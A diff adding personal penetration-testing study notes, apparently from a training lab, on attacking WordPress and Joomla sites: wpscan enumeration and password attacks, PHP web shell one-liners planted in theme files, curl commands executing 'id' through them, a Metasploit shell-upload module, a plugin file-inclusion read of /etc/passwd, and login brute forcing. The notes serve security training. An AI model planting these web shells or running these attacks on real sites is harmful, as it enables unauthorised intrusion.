@@ -121,3 +121,109 @@ to get a list of users
 sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token "token"
 
 to do a password attack: sudo wpscan --password-attack xmlrpc -t 20 -U username -P wordlist  --url --api-token
+
+With administrative access to WordPress, we can modify the PHP source code to execute system commands.
+
+Click on Appearance on the side panel and select Theme Editor. This page will let us edit the PHP source code directly.
+
+An inactive theme can be selected to avoid corrupting the primary theme. We already know that the active theme is Transport Gravity. An alternate theme such as Twenty Nineteen can be chosen instead.
+
+Click on Select after selecting the theme, and we can edit an uncommon page such as 404.php to add a web shell.
+
+web shell: system($_GET[0]);
+
+The code above should let us execute commands via the GET parameter 0. We add this single line to the file just below the comments to avoid too much modification of the contents.
+
+Click on Update File at the bottom to save. We know that WordPress themes are located at /wp-content/themes/<theme name>. We can interact with the web shell via the browser or using cURL.
+
+As always, we can then utilize this access to gain an interactive reverse shell and begin exploring the target.
+
+example: curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+The wp_admin_shell_upload module from Metasploit can be used to upload a shell and execute it automatically.
+
+![alt text](image-17.png)
+
+We can then issue the show options command to ensure that everything is set up properly. 
+
+In this lab example, we must specify both the vhost and the IP address, or the exploit will fail with the error Exploit aborted due to failure: not-found: The target does not appear to be using WordPress.
+
+During an assessment, we would want to make every attempt to clean up this artifact from the client system and, regardless of whether we were able to remove it or not, we should list this artifact in our report appendices. At the very least, our report should have an appendix section that lists the following information—more on this in a later module.
+
+The plugin mail-masta is no longer supported but has had over 2,300 downloads over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an unauthenticated SQL injection and a Local File Inclusion.
+
+Let's take a look at the vulnerable code for the mail-masta plugin.
+
+![alt text](image-18.png)
+
+As we can see, the pl parameter allows us to include a file without any type of input validation or sanitization. Using this, we can include arbitrary files on the webserver. Let's exploit this to retrieve the contents of the /etc/passwd file using cURL.
+
+wpDiscuz is a WordPress plugin for enhanced commenting on page posts.
+
+ Based on the version number (7.0.4), this exploit has a pretty good shot of getting us command execution. The crux of the vulnerability is a file upload bypass. wpDiscuz is intended only to allow image attachments. The file mime type functions could be bypassed, allowing an unauthenticated attacker to upload a malicious PHP file and gain remote code execution. More on the mime type detection functions bypass can be found here.
+
+ The exploit script takes two parameters: -u the URL and -p the path to a valid post.
+
+ The exploit as written may fail, but we can use cURL to execute commands using the uploaded web shell. We just need to append ?cmd= after the .php extension to run commands which we can see in the exploit script.
+
+ ![alt text](image-19.png)
+
+
+ Joomla 
+
+ Joomla - Discovery & Enumeration
+
+ We can often fingerprint Joomla by looking at the page source, which tells us that we are dealing with a Joomla site.
+
+ ![alt text](image-20.png)
+
+ The robots.txt file for a Joomla site will often look like this:
+
+![alt text](image-21.png)
+
+We can fingerprint the Joomla version if the README.txt file is present.
+
+![alt text](image-22.png)
+
+In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the media/system/js/ directory or by browsing to administrator/manifests/files/joomla.xml.
+
+![alt text](image-23.png)
+
+The cache.xml file can help to give us the approximate version. It is located at plugins/system/cache/cache.xml.
+
+Let's try out droopescan, a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
+
+sudo pip3 install droopescan
+
+droopescan scan joomla --url http://dev.inlanefreight.local/
+
+The default administrator account on Joomla installs is admin, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this script to attempt to brute force the login.
+
+sudo python3 joomla-brute.py -u http://dev.inlanefreight.local
+
+attacking Joomla
+
+if found creds, login 
+
+click on Templates on the bottom left under Configuration to pull up the templates menu.
+
+we can click on a template name. Let's choose protostar under the Template column header. This will bring us to the Templates: Customise page.
+
+ can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment.
+
+ We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.
+
+ Let's choose the error.php page. We'll add a PHP one-liner to gain code execution as follows.
+
+system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
+Once this is in, click on Save & Close at the top and confirm code execution using cURL.
+
+curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+
+
+
+
+
+  
